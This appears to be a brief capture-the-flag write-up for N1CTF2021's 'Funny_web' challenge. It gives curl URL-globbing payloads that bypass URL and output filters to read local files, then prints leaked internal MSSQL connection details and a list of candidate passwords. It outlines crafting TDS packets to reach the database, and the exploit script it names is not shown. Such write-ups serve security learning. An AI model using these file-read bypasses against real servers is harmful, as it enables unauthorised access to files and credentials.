## Funny_web

Reference：[https://github.com/curl/curl/blob/master/src/tool_urlglob.c#L360](https://github.com/curl/curl/blob/master/src/tool_urlglob.c#L360)

bypass url check：`'fi[k-m]e:///hint.txt'`

bypass output check：`'fi[k-m]e:///{hint.txt,7f7d9107-a48b-284e-a29e-66c871bf5706}'`

```
mssql_host：10.11.22.13
mssql_port：1433
mssql_username：sa
mssql_password in /password.txt
flag in HKEY_LOCAL_MACHINE\SOFTWARE\N1CTF2021
```

read mssql password list: `fi[k-m]e:///{password.txt,7f7d9107-a48b-284e-a29e-66c871bf5706}`

```
9fb8da74-5186-4471-9ee5-155539f84e14
8bd2580b-0b8e-4fbf-8b14-dcebfe7e62b7
cc689ef1-3e80-440e-a448-2558bc031c9b
7ce9d6fc-5ce3-4cd7-acb7-1e37651d26a5
d0e7a7fa-6b75-4998-a87d-736170a03110
a75d0240-38d2-47cc-ba6d-f71a2192a675
5514193a-bd35-4b17-98ee-d6e71e1f73dc
....
```

So we need to construct the data packet of the `TDS` protocol.

we can refer to the following url

https://www.freetds.org/tds.html

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/60f56408-0188-4cd5-8b90-25c6f2423868

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/773a62b6-ee89-4c02-9e5e-344882630aac

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/f2026cd3-9a46-4a3f-9a08-f63140bcbbe3

exp: `exp.py`
